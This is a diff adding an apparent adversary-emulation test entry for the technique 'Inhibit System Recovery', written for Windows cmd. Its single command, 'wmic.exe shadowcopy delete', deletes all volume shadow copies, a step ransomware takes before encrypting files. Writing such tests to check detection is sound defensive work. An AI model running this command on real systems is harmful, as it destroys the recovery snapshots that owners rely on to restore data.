@@ -1,0 +1,7 @@
+#TechniqueName: Inhibit System Recovery
+#AtomicTestName: Windows - Delete Volume Shadow Copies via WMI
+#Language: cmd
+
+#commands
+wmic.exe shadowcopy delete
+
